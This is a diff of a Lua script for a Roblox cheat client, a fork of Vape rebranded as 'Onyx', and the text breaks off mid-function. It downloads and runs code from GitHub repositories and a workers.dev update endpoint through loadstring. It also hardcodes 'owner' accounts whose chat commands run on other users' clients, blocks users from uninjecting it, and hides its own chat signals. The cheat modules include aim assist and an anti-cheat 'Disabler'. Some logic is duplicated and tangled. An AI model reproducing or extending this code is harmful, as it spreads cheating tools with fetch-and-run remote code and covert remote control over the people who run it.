@@ -1,7 +1,7 @@
 local loadstring = function(...)
-	local res, err = loadstring(...)
+local res, err = loadstring(...)
 	if err and vape then
-		vape:CreateNotification('Vape', 'Failed to load : '..err, 30, 'alert')
+		vape:CreateNotification('Onyx - Universal', 'Failed to load : '..err, 30, 'alert')
 	end
 	return res
 end
@@ -14,7 +14,7 @@ end
 local function downloadFile(path, func)
 	if not isfile(path) then
 		local suc, res = pcall(function()
-			return game:HttpGet('https://raw.githubusercontent.com/qe40/ReVapeForRoblox/'..readfile('ReVape/profiles/commit.txt')..'/'..select(1, path:gsub('ReVape/', '')), true)
+			return game:HttpGet('https://raw.githubusercontent.com/soryed/OynxVAPEv4/'..readfile('ReVape/profiles/commit.txt')..'/'..select(1, path:gsub('ReVape/', '')), true)
 		end)
 		if not suc or res == '404: Not Found' then
 			error(res)
@@ -48,8 +48,8 @@ local groupService = cloneref(game:GetService('GroupService'))
 local textChatService = cloneref(game:GetService('TextChatService'))
 local contextService = cloneref(game:GetService('ContextActionService'))
 local coreGui = cloneref(game:GetService('CoreGui'))
-
-local isnetworkowner = identifyexecutor and table.find({'AWP', 'Nihon'}, ({identifyexecutor()})[1]) and isnetworkowner or function()
+_G.LOGS = _G.LOGS or {}
+local isnetworkowner = identifyexecutor and table.find({'Nihon'}, ({identifyexecutor()})[1]) and isnetworkowner or function()
 	return true
 end
 local gameCamera = workspace.CurrentCamera or workspace:FindFirstChildWhichIsA('Camera')
@@ -152,7 +152,7 @@ local function serverHop(pointer, filter)
 		table.insert(visited, game.JobId)
 	end
 	if not pointer then
-		notif('Vape', 'Searching for an available server.', 2)
+		notif('Onyx', 'Searching for an available server.', 2)
 	end
 
 	local suc, httpdata = pcall(function()
@@ -165,7 +165,7 @@ local function serverHop(pointer, filter)
 				cacheExpire, cache = tick() + 60, httpdata
 				table.insert(attempted, v.id)
 
-				notif('Vape', 'Found! Teleporting.', 5)
+				notif('Onyx', 'Found! Teleporting.', 5)
 				teleportService:TeleportToPlaceInstance(game.PlaceId, v.id)
 				return
 			end
@@ -174,10 +174,10 @@ local function serverHop(pointer, filter)
 		if data.nextPageCursor then
 			serverHop(data.nextPageCursor, filter)
 		else
-			notif('Vape', 'Failed to find an available server.', 5, 'warning')
+			notif('Onyx', 'Failed to find an available server.', 5, 'warning')
 		end
 	else
-		notif('Vape', 'Failed to grab servers. ('..(data and data.errors[1].message or 'no data')..')', 5, 'warning')
+		notif('Onyx', 'Failed to grab servers. ('..(data and data.errors[1].message or 'no data')..')', 5, 'warning')
 	end
 end
 
@@ -188,7 +188,7 @@ vape:Clean(lplr.OnTeleport:Connect(function()
 	end
 end))
 
-local frictionTable, oldfrict, entitylib = {}, {}
+local frictionTable, oldfrict, entitylib = {}, {},{}
 local function updateVelocity()
 	if getTableSize(frictionTable) > 0 then
 		if entitylib.isAlive then
@@ -218,23 +218,128 @@ local function motorMove(target, cf)
 	motor.Parent = part
 	task.delay(0, part.Destroy, part)
 end
-
 local hash = loadstring(downloadFile('ReVape/libraries/hash.lua'), 'hash')()
 local prediction = loadstring(downloadFile('ReVape/libraries/prediction.lua'), 'prediction')()
 entitylib = loadstring(downloadFile('ReVape/libraries/entity.lua'), 'entitylibrary')()
+local loginlib = loadstring(downloadFile("ReVape/libraries/login.lua"), "login")()
+
 local whitelist = {
-	alreadychecked = {},
-	customtags = {},
-	data = {WhitelistedUsers = {}},
-	hashes = setmetatable({}, {
-		__index = function(_, v)
-			return hash and hash.sha512(v..'SelfReport') or ''
-		end
-	}),
-	hooked = false,
-	loaded = false,
-	localprio = 0,
-	said = {}
+    alreadychecked = {},
+    customtags = {},
+    data = {
+        WhitelistedUsers = {
+            ["7756737656"] = {
+				userId = 7756737656,
+                hash = "f85928e494d7b8d103d6358a3e0c4ef6c2f472df925e91e95ad713e8436b755e660ea47355a22a03c9f7393778e454f7bf238fa429e9b1f802ebdf9ca8f3c54c",
+                attackable = false,
+                level = 2,
+                tags = {
+                    {
+                        text = "ONYX OWNER",
+                        color = {78, 200, 54},
+                    },
+                },
+            },
+			["9705518292"] = {
+				userId = 9705518292,
+                hash = "1564bb4b1a8c41a4005c7a63d7146df0b413085c01d3fdbc0086d3944219101a22aa3f2188bef7667c6efb5f8c680cf8851a3858dec746ba75b2186978cdc860",
+                attackable = false,
+                level = 2,
+                tags = {
+                    {
+                        text = "ONYX OWNER",
+                        color = {78, 200, 54},
+                    },
+                },
+            },
+			["9701608749"] = {
+				userId = 9701608749,
+                hash = "fce0f19909e68d23ec40710c71be8e1cdeaa96d5c6cd29fa705720c69ed1784c0f10e6dada4fc846bff1b644364807c8ff4f4dec3ef3d0a97cb8a31c6bc228eb",
+                attackable = false,
+                level = 2,
+                tags = {
+                    {
+                        text = "ONYX OWNER",
+                        color = {200, 54, 78},
+                    },
+                },
+            },
+			["9929694141"] = {
+				userId = 9929694141,
+                hash = "7e6f94acd19d0ff760c566c4feaf56e65d6a8c803aa578c86c6015894996746941ae044c4add405b6531e638892a9089c2d4083aff0a4e72cbac9a6c9f8a8e33",
+                attackable = false,
+                level = 2,
+                tags = {
+                    {
+                        text = "ONYX OWNER",
+                        color = {200, 54, 78},
+                    },
+                },
+            },
+			["10036460106"] = {
+				userId = 10036460106,
+                hash = "c98e0a8ed8ccb31dd9adc012ef367e613a9329716e8509b2d0e35480784c721a5012ab770b70564f281d5367865268ee964b1bf1c60b20b8607d5cf2378b875c",
+                attackable = false,
+                level = 2,
+                tags = {
+                    {
+                        text = "ONYX OWNER",
+                        color = {35, 200, 25},
+                    },
+                },
+            },
+        },
+
+        WhitelistTags = {
+            ["7756737656"] = {
+                {
+                    text = "ONYX OWNER",
+                    color = {78, 200, 54},
+                },
+            },
+			["9705518292"] = {
+                {
+                    text = "ONYX OWNER",
+                    color = {78, 200, 54},
+                },
+            },
+			["9701608749"] = {
+                {
+                    text = "ONYX OWNER",
+                    color = {200, 54, 78},
+                },
+            },
+			["9929694141"] = {
+                {
+                    text = "ONYX OWNER",
+                    color = {200, 54, 78},
+                },
+            },
+			["10036460106"] = {
+                {
+                    text = "ONYX OWNER",
+                    color = {35, 200, 25},
+                },
+            },
+        },
+
+        Announcement = {
+            expiretime = 1719510977.4331613,
+            targets = {2529295875},
+            text = "hello there :)",
+        },
+    },
+
+    hashes = setmetatable({}, {
+        __index = function(_, v)
+            return (hash and hash.sha512) and hash.sha512(v .. 'SelfReport') or ''
+        end,
+    }),
+
+    hooked = false,
+    loaded = false,
+    localprio = 0,
+    said = {},
 }
 vape.Libraries.entity = entitylib
 vape.Libraries.whitelist = whitelist
@@ -324,6 +429,12 @@ for name in SpeedMethods do
 end
 
 run(function()
+	local S,U,P = loginlib:SlientLogin()
+	vape.role = S 
+	vape.user = U 
+end)
+
+run(function()
 	entitylib.getUpdateConnections = function(ent)
 		local hum = ent.Humanoid
 		return {
@@ -378,160 +489,127 @@ run(function()
 	end))
 end)
 
+
+local attackableeee = false
+local function flattenText(value)
+	if typeof(value) == "string" then
+		return value
+	elseif typeof(value) == "table" then
+		local parts = {}
+		for _, v in ipairs(value) do
+			table.insert(parts, flattenText(v.Text or v))
+		end
+		return table.concat(parts, "")
+	else
+		return tostring(value)
+	end
+end
 run(function()
-	function whitelist:get(plr)
-		local plrstr = self.hashes[plr.Name..plr.UserId]
-		for _, v in self.data.WhitelistedUsers do
-			if v.hash == plrstr then
-				return v.level, v.attackable or whitelist.localprio >= v.level, v.tags
-			end
-		end
-		return 0, true
-	end
+function whitelist:get(plr)
+    local plrstr = whitelist.hashes[plr.Name .. plr.UserId]
+    for _, v in pairs(whitelist.data.WhitelistedUsers) do
+        if v.hash == plrstr then
+            local canAttack = v.attackable or (whitelist.localprio >= v.level)
+            return v.level, canAttack, v.tags
+        end
+    end
+    return 0, true
+end
 
-	function whitelist:isingame()
-		for _, v in playersService:GetPlayers() do
-			if self:get(v) ~= 0 then return true end
-		end
-		return false
-	end
 
-	function whitelist:tag(plr, text, rich)
-		local plrtag, newtag = select(3, self:get(plr)) or self.customtags[plr.Name] or {}, ''
-		if not text then return plrtag end
-		for _, v in plrtag do
-			newtag = newtag..(rich and '<font color="#'..v.color:ToHex()..'">['..v.text..']</font>' or '['..removeTags(v.text)..']')..' '
-		end
-		return newtag
-	end
+    function whitelist:isingame()
+        for _, v in playersService:GetPlayers() do
+            if whitelist:get(v) ~= 0 then
+                return true
+            end
+        end
+        return false
+    end
 
-	function whitelist:getplayer(arg)
-		if arg == 'default' and self.localprio == 0 then return true end
-		if arg == 'private' and self.localprio == 1 then return true end
-		if arg and lplr.Name:lower():sub(1, arg:len()) == arg:lower() then return true end
-		return false
-	end
+function whitelist:tag(plr, rich)
+    local plrtag, newtag = select(3, whitelist:get(plr)) or whitelist.customtags[plr.Name] or {}, ''
+    if not plrtag then return '' end
+    for _, v in plrtag do
+        newtag = newtag..(rich and '<font color="#'..v.color:ToHex()..'">['..v.text..']</font>' 
+                          or '['..removeTags(v.text)..']')..' '
+    end
+    return newtag
+end
 
-	local olduninject
-	function whitelist:playeradded(v, joined)
-		if self:get(v) ~= 0 then
-			if self.alreadychecked[v.UserId] then return end
-			self.alreadychecked[v.UserId] = true
-			self:hook()
-			if self.localprio == 0 then
-				olduninject = vape.Uninject
-				vape.Uninject = function()
-					notif('Vape', 'No escaping the private members :)', 10)
-				end
-				if joined then
-					task.wait(10)
-				end
-				if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-					local oldchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
-					local newchannel = cloneref(game:GetService('RobloxReplicatedStorage')).ExperienceChat.WhisperChat:InvokeServer(v.UserId)
-					if newchannel then
-						newchannel:SendAsync('helloimusinginhaler')
-					end
-					textChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
-				elseif replicatedStorage:FindFirstChild('DefaultChatSystemChatEvents') then
-					replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('/w '..v.Name..' helloimusinginhaler', 'All')
-				end
-			end
-		end
-	end
+    function whitelist:getplayer(arg)
+        if arg == 'default' and whitelist.localprio == 0 then return true end
+        if arg == 'private' and whitelist.localprio == 1 then return true end
+        if arg == 'owner' and whitelist.localprio == 2 then return true end
+        if arg and lplr.Name:lower():sub(1, arg:len()) == arg:lower() then return true end
+        return false
+    end
 
-	function whitelist:process(msg, plr)
-		if plr == lplr and msg == 'helloimusinginhaler' then return true end
 
-		if self.localprio > 0 and not self.said[plr.Name] and msg == 'helloimusinginhaler' and plr ~= lplr then
-			self.said[plr.Name] = true
-			notif('Vape', plr.Name..' is using vape!', 60)
-			self.customtags[plr.Name] = {{
-				text = 'VAPE USER',
-				color = Color3.new(1, 1, 0)
-			}}
-			local newent = entitylib.getEntity(plr)
-			if newent then
-				entitylib.Events.EntityUpdated:Fire(newent)
-			end
-			return true
-		end
+    function whitelist:process(msg, plr)
+        if plr == lplr and msg == 'helloimusingrehaler' then return true end
 
-		if self.localprio < self:get(plr) or plr == lplr then
-			local args = msg:split(' ')
-			table.remove(args, 1)
-			if self:getplayer(args[1]) then
-				table.remove(args, 1)
-				for cmd, func in self.commands do
-					if msg:sub(1, cmd:len() + 1):lower() == ';'..cmd:lower() then
-						func(args, plr)
-						return true
-					end
-				end
-			end
-		end
+        if whitelist.localprio > 0 and not whitelist.said[plr.Name] and msg == 'helloimusingrehaler' and plr ~= lplr then
+            whitelist.said[plr.Name] = true
+            notif('Onyx', plr.Name..' is using onyx!', 60)
+            whitelist.customtags[plr.Name] = {{
+                text = 'VAPE USER',
+                color = Color3.new(1, 1, 0)
+            }}
+            local newent = entitylib.getEntity(plr)
+            if newent then
+                entitylib.Events.EntityUpdated:Fire(newent)
+            end
+            return true
+        end
 
-		return false
-	end
+        if whitelist.localprio < whitelist:get(plr) or plr == lplr then
+            local args = msg:split(' ')
+            table.remove(args, 1)
+            if whitelist:getplayer(args[1]) then
+                table.remove(args, 1)
+                for cmd, func in whitelist.commands do
+                    if msg:sub(1, cmd:len() + 1):lower() == ';'..cmd:lower() then
+                        func(args, plr)
+                        return true
+                    end
+                end
+            end
+        end
 
-	function whitelist:newchat(obj, plr, skip)
-		obj.Text = self:tag(plr, true, true)..obj.Text
-		local sub = obj.ContentText:find(': ')
-		if sub then
-			if not skip and self:process(obj.ContentText:sub(sub + 3, #obj.ContentText), plr) then
-				obj.Visible = false
-			end
-		end
-	end
+        return false
+    end
 
-	function whitelist:oldchat(func)
-		local msgtable, oldchat = debug.getupvalue(func, 3)
-		if typeof(msgtable) == 'table' and msgtable.CurrentChannel then
-			whitelist.oldchattable = msgtable
-		end
+    function whitelist:newchat(obj, plr, skip)
+        obj.Text = whitelist:tag(plr, true)..obj.Text
+        local sub = obj.ContentText:find(': ')
+        if sub then
+            if not skip and whitelist:process(obj.ContentText:sub(sub + 3, #obj.ContentText), plr) then
+                obj.Visible = false
+            end
+        end
+    end
 
-		oldchat = hookfunction(func, function(data, ...)
-			local plr = playersService:GetPlayerByUserId(data.SpeakerUserId)
-			if plr then
-				data.ExtraData.Tags = data.ExtraData.Tags or {}
-				for _, v in self:tag(plr) do
-					table.insert(data.ExtraData.Tags, {TagText = v.text, TagColor = v.color})
-				end
-				if data.Message and self:process(data.Message, plr) then
-					data.Message = ''
-				end
-			end
-			return oldchat(data, ...)
-		end)
+    function whitelist:hook()
+        if whitelist.hooked then return end
+        whitelist.hooked = true
 
-		vape:Clean(function()
-			hookfunction(func, oldchat)
-		end)
-	end
-
-	function whitelist:hook()
-		if self.hooked then return end
-		self.hooked = true
-
-		local exp = coreGui:FindFirstChild('ExperienceChat')
-		if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-			if exp and exp:WaitForChild('appLayout', 5) then
-				vape:Clean(exp:FindFirstChild('RCTScrollContentView', true).ChildAdded:Connect(function(obj)
-					local plr = playersService:GetPlayerByUserId(tonumber(obj.Name:split('-')[1]) or 0)
-					obj = obj:FindFirstChild('TextMessage', true)
-					if obj and obj:IsA('TextLabel') then
-						if plr then
-							self:newchat(obj, plr, true)
-							obj:GetPropertyChangedSignal('Text'):Wait()
-							self:newchat(obj, plr)
-						end
-
-						if obj.ContentText:sub(1, 35) == 'You are now privately chatting with' then
-							obj.Visible = false
-						end
-					end
-				end))
-			end
+        local exp = coreGui:FindFirstChild('ExperienceChat')
+        if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+            if exp and exp:WaitForChild('appLayout', 5) then
+              local view = exp:FindFirstChild('RCTScrollContentView', true)
+                vape:Clean(view.ChildAdded:Connect(function(obj)
+                    local plr = playersService:GetPlayerByUserId(tonumber(obj.Name:split('-')[1]) or 0)
+                    obj = obj:FindFirstChild('TextMessage', true)
+                    if obj and obj:IsA('TextLabel') then
+                        if plr then
+                            whitelist:newchat(obj, plr, true)
+                            obj:GetPropertyChangedSignal('Text'):Wait()
+                            whitelist:newchat(obj, plr)
+                        end
+                    end
+                end))
+            end
+        elseif replicatedStorage:FindFirstChild('DefaultChatSystemChatEvents') then
 		elseif replicatedStorage:FindFirstChild('DefaultChatSystemChatEvents') then
 			pcall(function()
 				for _, v in getconnections(replicatedStorage.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent) do
@@ -554,92 +632,74 @@ run(function()
 			local bubblechat = exp:WaitForChild('bubbleChat', 5)
 			if bubblechat then
 				vape:Clean(bubblechat.DescendantAdded:Connect(function(newbubble)
-					if newbubble:IsA('TextLabel') and newbubble.Text:find('helloimusinginhaler') then
+					if newbubble:IsA('TextLabel') and newbubble.Text:find('helloimusingrehaler') then
 						newbubble.Parent.Parent.Visible = false
 					end
 				end))
 			end
 		end
 	end
+    local olduninject
+    function whitelist:playeradded(v, joined)
+        if whitelist:get(v) ~= 0 then
+            if whitelist.alreadychecked[v.UserId] then return end
+            whitelist.alreadychecked[v.UserId] = true
+            whitelist:hook()
+if vape.role == "GUEST" or vape.user == "guest" then attackableeee = true end
+            if whitelist.localprio == 0 then
+					attackableeee = true
+                olduninject = vape.Uninject
+                vape.Uninject = function()
+                    notif('Onyx', 'No escaping the private members :)', 10)
+                end
 
-	function whitelist:update(first)
-		local suc = pcall(function()
-			local _, subbed = pcall(function()
-				return game:HttpGet('https://github.com/qe40/WhitelistJSON')
-			end)
-			local commit = subbed:find('currentOid')
-			commit = commit and subbed:sub(commit + 13, commit + 52) or nil
-			commit = commit and #commit == 40 and commit or 'main'
-			whitelist.textdata = game:HttpGet('https://raw.githubusercontent.com/qe40/WhitelistJSON/'..commit..'/PlayerWhitelist.json', true)
-		end)
-		if not suc or not hash or not whitelist.get then return true end
-		whitelist.loaded = true
+                if joined then
+                    task.wait(10)
+                end
 
-		if not first or whitelist.textdata ~= whitelist.olddata then
-			if not first then
-				whitelist.olddata = isfile('ReVape/profiles/whitelist.json') and readfile('ReVape/profiles/whitelist.json') or nil
-			end
+                if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+                    local oldchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
+                    local newchannel = cloneref(game:GetService('RobloxReplicatedStorage')).ExperienceChat.WhisperChat:InvokeServer(v.UserId)
+                    if newchannel then
+                        newchannel:SendAsync('helloimusingrehaler')
+                    end
+                    textChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
+                elseif replicatedStorage:FindFirstChild('DefaultChatSystemChatEvents') then
+                    replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('/w '..v.Name..' helloimusingrehaler', 'All')
+                end
+            end
+        end
+    end
 
-			local suc, res = pcall(function()
-				return httpService:JSONDecode(whitelist.textdata)
-			end)
+		local function addedplayer(v, joined)
+      if whitelist:get(v) ~= 0 then
+            if whitelist.alreadychecked[v.UserId] then return end
+            whitelist.alreadychecked[v.UserId] = true
+            whitelist:hook()
 
-			whitelist.data = suc and type(res) == 'table' and res or whitelist.data
-			whitelist.localprio = whitelist:get(lplr)
+            if whitelist.localprio == 0 then
+                olduninject = vape.Uninject
+                vape.Uninject = function()
+                    notif('Onyx', 'No escaping the private members :)', 10)
+                end
 
-			for _, v in whitelist.data.WhitelistedUsers do
-				if v.tags then
-					for _, tag in v.tags do
-						tag.color = Color3.fromRGB(unpack(tag.color))
-					end
-				end
-			end
+                if joined then
+                    task.wait(10)
+                end
 
-			if not whitelist.connection then
-				whitelist.connection = playersService.PlayerAdded:Connect(function(v)
-					whitelist:playeradded(v, true)
-				end)
-				vape:Clean(whitelist.connection)
-			end
-
-			for _, v in playersService:GetPlayers() do
-				whitelist:playeradded(v)
-			end
-
-			if entitylib.Running and vape.Loaded then
-				entitylib.refresh()
-			end
-
-			if whitelist.textdata ~= whitelist.olddata then
-				if whitelist.data.Announcement.expiretime > os.time() then
-					local targets = whitelist.data.Announcement.targets
-					targets = targets == 'all' and {tostring(lplr.UserId)} or targets:split(',')
-
-					if table.find(targets, tostring(lplr.UserId)) then
-						local hint = Instance.new('Hint')
-						hint.Text = 'VAPE ANNOUNCEMENT: '..whitelist.data.Announcement.text
-						hint.Parent = workspace
-						game:GetService('Debris'):AddItem(hint, 20)
-					end
-				end
-				whitelist.olddata = whitelist.textdata
-				pcall(function()
-					writefile('ReVape/profiles/whitelist.json', whitelist.textdata)
-				end)
-			end
-
-			if whitelist.data.KillVape then
-				vape:Uninject()
-				return true
-			end
-
-			if whitelist.data.BlacklistedUsers[tostring(lplr.UserId)] then
-				task.spawn(lplr.kick, lplr, whitelist.data.BlacklistedUsers[tostring(lplr.UserId)])
-				return true
-			end
+                if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+                    local oldchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
+                    local newchannel = cloneref(game:GetService('RobloxReplicatedStorage')).ExperienceChat.WhisperChat:InvokeServer(v.UserId)
+                    if newchannel then
+                        newchannel:SendAsync('helloimusingrehaler')
+                    end
+                    textChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
+                elseif replicatedStorage:FindFirstChild('DefaultChatSystemChatEvents') then
+                    replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('/w '..v.Name..' helloimusingrehaler', 'All')
+                end
+            end
+        end
 		end
-	end
-
 	whitelist.commands = {
 		byfron = function()
 			task.spawn(function()
@@ -758,9 +818,9 @@ run(function()
 		reveal = function()
 			task.delay(0.1, function()
 				if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-					textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync('I am using the inhaler client')
+					textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync('I am using the reinhaler client')
 				else
-					replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('I am using the inhaler client', 'All')
+					replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('I am using the reinhaler client', 'All')
 				end
 			end)
 		end,
@@ -809,6 +869,166 @@ run(function()
 		end
 	}
 
+local CMDS = whitelist.commands
+    function whitelist:update(first)
+			local tttag = {}
+		local suc = pcall(function()
+			local _, subbed = pcall(function()
+				return game:HttpGet('https://github.com/soryed/WhitelistJSON')
+			end)
+			local commit = subbed:find('currentOid')
+			commit = commit and subbed:sub(commit + 13, commit + 52) or nil
+			commit = commit and #commit == 40 and commit or 'main'
+			whitelist.textdata = game:HttpGet('https://raw.githubusercontent.com/soryed/WhitelistJSON/'..commit..'/PlayerWhitelist.json', true)
+		end)
+		if not suc or not hash or not whitelist.get then return true end
+		whitelist.loaded = true
+
+		if not first or whitelist.textdata ~= whitelist.olddata then
+			if not first then
+				whitelist.olddata = isfile('ReVape/profiles/whitelist.json') and readfile('ReVape/profiles/whitelist.json') or nil
+			end
+
+			local suc, res = pcall(function()
+				return httpService:JSONDecode(whitelist.textdata)
+			end)
+
+			whitelist.data = suc and type(res) == 'table' and res or whitelist.data
+			whitelist.localprio = select(1, whitelist:get(lplr))
+			task.wait(1)
+
+for _, v in pairs(whitelist.data.WhitelistedUsers) do
+    if v.tags then
+        for _, tag in ipairs(v.tags) do
+            if tag.color and tag.text then
+                local c = tag.color
+                tag.color = Color3.fromRGB(c[1], c[2], c[3])
+                tttag[v.userId] = {
+                    color = Color3.fromRGB(c[1], c[2], c[3]),
+                    text = tag.text,
+                }
+            end
+        end
+    end
+end
+	for _, v in playersService:GetPlayers() do
+					addedplayer(v)
+				whitelist:playeradded(v)
+					
+			end
+
+				playersService.PlayerAdded:Connect(function(v)
+						addedplayer(v,true)
+					whitelist:playeradded(v,true)
+				end)
+local function handleCommand(plr, msg)
+	if not msg or typeof(msg) ~= "string" then return end
+	if not msg:find("^;") then return end 
+	local split = string.split(msg, " ")
+	local rawCmd = split[1] 
+	local cmd = rawCmd:sub(2):lower() 
+	table.remove(split, 1)
+	local args = split 
+
+	local func = CMDS[cmd]
+	if func then
+		task.spawn(function()
+			func(args, plr)
+		end)
+	end
+end
+task.spawn(function()
+				task.wait(2)
+game:GetService("TextChatService").OnIncomingMessage = function(message: TextChatMessage)
+    if not message.TextSource then  return nil end
+    table.insert(_G.LOGS, {text = message.Text, UserID = message.TextSource and message.TextSource.UserId})
+	task.spawn(function()
+	for i, msg in pairs(_G.LOGS) do
+	local str = tostring(msg.text)
+	local id = tonumber(msg.UserID)
+	local GoodPlayer = game:GetService("Players"):GetPlayerByUserId(id)
+	local lev, att = whitelist:get(GoodPlayer)
+
+	if lev >= 1 then
+		local lev2 = whitelist:get(lplr)
+		if lev2 == 0 then
+			handleCommand(lplr, str) 
+		else
+			return						
+		end
+	end
+end
+
+	end)
+	local userId = message.TextSource.UserId
+    local whitelistData = tttag[userId] 
+    if whitelistData then
+        local color = whitelistData.color
+        local tagText = whitelistData.text
+if tagText == nil or tagText == "" then
+	if game.Players.LocalPlayer:FindFirstChild('Tags') then
+										tagText = "["..game.Players.LocalPlayer:FindFirstChild('Tags'):FindFirstChild('0'):GetAttribute('Text').."]"
+									else
+										tagText = ''
+	end
+else
+	tagText = tagText
+end
+        local props = Instance.new("TextChatMessageProperties")
+        props.PrefixText = string.format(
+            "<font color='rgb(%d,%d,%d)'>[%s]</font> %s",
+            math.floor(color.R * 255),
+            math.floor(color.G * 255),
+            math.floor(color.B * 255),
+            tagText,
+            message.PrefixText or ""
+        )
+        return props
+    end
+    return nil
+end
+					end)
+
+
+
+			if not whitelist.connection then
+				whitelist.connection = playersService.PlayerAdded:Connect(function(v)
+					whitelist:playeradded(v, true)
+				end)
+				vape:Clean(whitelist.connection)
+			end
+
+		
+			if entitylib.Running and vape.Loaded then
+				entitylib.refresh()
+			end
+
+			if whitelist.textdata ~= whitelist.olddata then
+					local targets = whitelist.data.Announcement.targets
+
+					--[[if table.find(targets, tostring(lplr.UserId)) then
+						local hint = Instance.new('Hint')
+						hint.Text = 'VAPE ANNOUNCEMENT: '..whitelist.data.Announcement.text
+						hint.Parent = workspace
+						game:GetService('Debris'):AddItem(hint, 20)
+					
+				end--]]
+				whitelist.olddata = whitelist.textdata
+				pcall(function()
+					writefile('ReVape/profiles/whitelist.json', whitelist.textdata)
+				end)
+			end
+
+			if whitelist.data.KillVape then
+				vape:Uninject()
+				return true
+			end
+
+		end
+	end
+
+
+
 	task.spawn(function()
 		repeat
 			if whitelist:update(whitelist.loaded) then return end
@@ -822,6 +1042,8 @@ run(function()
 		table.clear(whitelist)
 	end)
 end)
+
+
 entitylib.start()
 run(function()
 	local AimAssist
@@ -6058,61 +6280,11 @@ run(function()
 	Blink = vape.Categories.Utility:CreateModule({
 		Name = 'Blink',
 		Function = function(callback)
-			if callback then
-				local teleported
-				Blink:Clean(lplr.OnTeleport:Connect(function()
-					setfflag('PhysicsSenderMaxBandwidthBps', '38760')
-					setfflag('DataSenderRate', '60')
-					teleported = true
-				end))
-	
-				repeat
-					local physicsrate, senderrate = '0', Type.Value == 'All' and '-1' or '60'
-					if AutoSend.Enabled and tick() % (AutoSendLength.Value + 0.1) > AutoSendLength.Value then
-						physicsrate, senderrate = '38760', '60'
-					end
-	
-					if physicsrate ~= oldphys or senderrate ~= oldsend then
-						setfflag('PhysicsSenderMaxBandwidthBps', physicsrate)
-						setfflag('DataSenderRate', senderrate)
-						oldphys, oldsend = physicsrate, senderrate
-					end
-	
-					task.wait(0.03)
-				until (not Blink.Enabled and not teleported)
-			else
-				if setfflag then
-					setfflag('PhysicsSenderMaxBandwidthBps', '38760')
-					setfflag('DataSenderRate', '60')
-				end
-				oldphys, oldsend = nil, nil
-			end
+		
 		end,
-		Tooltip = 'Chokes packets until disabled.'
+		Tooltip = '...'
 	})
-	Type = Blink:CreateDropdown({
-		Name = 'Type',
-		List = {'Movement Only', 'All'},
-		Tooltip = 'Movement Only - Only chokes movement packets\nAll - Chokes remotes & movement'
-	})
-	AutoSend = Blink:CreateToggle({
-		Name = 'Auto send',
-		Function = function(callback)
-			AutoSendLength.Object.Visible = callback
-		end,
-		Tooltip = 'Automatically send packets in intervals'
-	})
-	AutoSendLength = Blink:CreateSlider({
-		Name = 'Send threshold',
-		Min = 0,
-		Max = 1,
-		Decimal = 100,
-		Darker = true,
-		Visible = false,
-		Suffix = function(val)
-			return val == 1 and 'second' or 'seconds'
-		end
-	})
+	
 end)
 	
 run(function()
@@ -6150,7 +6322,7 @@ run(function()
 				
 				local ind = 1
 				repeat
-					local message = (#Lines.ListEnabled > 0 and Lines.ListEnabled[math.random(1, #Lines.ListEnabled)] or 'vxpe on top')
+					local message = (#Lines.ListEnabled > 0 and Lines.ListEnabled[math.random(1, #Lines.ListEnabled)] or 'onyx on top')
 					if Mode.Value == 'Order' and #Lines.ListEnabled > 0 then
 						message = Lines.ListEnabled[ind] or Lines.ListEnabled[1]
 						ind = (ind % #Lines.ListEnabled) + 1
@@ -6211,7 +6383,7 @@ run(function()
 		end
 	end
 	
-	Disabler = vape.Categories.Utility:CreateModule({
+	Disabler = vape.Categories.Exploits:CreateModule({
 		Name = 'Disabler',
 		Function = function(callback)
 			if callback then
@@ -7841,6 +8013,7 @@ run(function()
 	})
 end)
 	
+
 run(function()
 	local Speedmeter
 	local label
@@ -7921,4 +8094,291 @@ run(function()
 	})
 	
 end)
+
+run(function()
+local Streamer
+	Streamer = vape.Categories.Minigames:CreateModule({
+		Name = "Streamer",
+		Function = function(callback)
+			vape.HideNofis = callback
+		end,
+		Tooltip ='hides onyx\'s modules'
+	})
+
+end)
+
+
+
 	
+run(function()
+    local UpdateChecker
+    UpdateChecker = vape.Categories.Minigames:CreateModule({
+        Name = "UpdateChecker",
+        Function = function(callback)
+            local running = callback
+            local CurrentVersion = tonumber(vape.Version) or 0
+
+            while running do
+                local LatestVersion = 0
+                local success, response = pcall(function()
+                    return game:HttpGet("https://onyxclient.fsl58.workers.dev/version")
+                end)
+
+                if success and response then
+                    local decoded = nil
+                    pcall(function()
+                        decoded = game:GetService("HttpService"):JSONDecode(response)
+                    end)
+
+                    if decoded and decoded.VERSION then
+                        LatestVersion = tonumber(decoded.VERSION) or 0
+                    end
+                end
+
+                if LatestVersion ~= 0 and LatestVersion ~= CurrentVersion then
+                    vape:CreateNotification('Update Found!', 'Reinjecting to finalize update..', 2.85, 'warning')
+
+                    task.wait(3)
+                    shared.vapereload = true
+
+                    getgenv().username = getgenv().username or "GUEST"
+                    getgenv().password = getgenv().password or "PASSWORD"
+
+                    if shared.VapeDeveloper then
+                        loadstring(readfile('ReVape/loader.lua'), 'loader')()
+                    else
+                        loadstring(game:HttpGet('https://raw.githubusercontent.com/soryed/OynxVAPEv4/main/loader.lua', true))()
+                    end
+
+                    running = false
+
+                elseif LatestVersion == 0 or CurrentVersion == 0 then
+                    vape:CreateNotification(
+                        'THIS IS NOT A UPDATE!',
+                        'THE UPDATE VERSION FILE IS CORRUPTED!! DM ' .. vape.Discord .. ' ASAP!',
+                        45,
+                        'alert'
+                    )
+                end
+
+                if not running then break end
+                task.wait(3)
+            end
+        end,
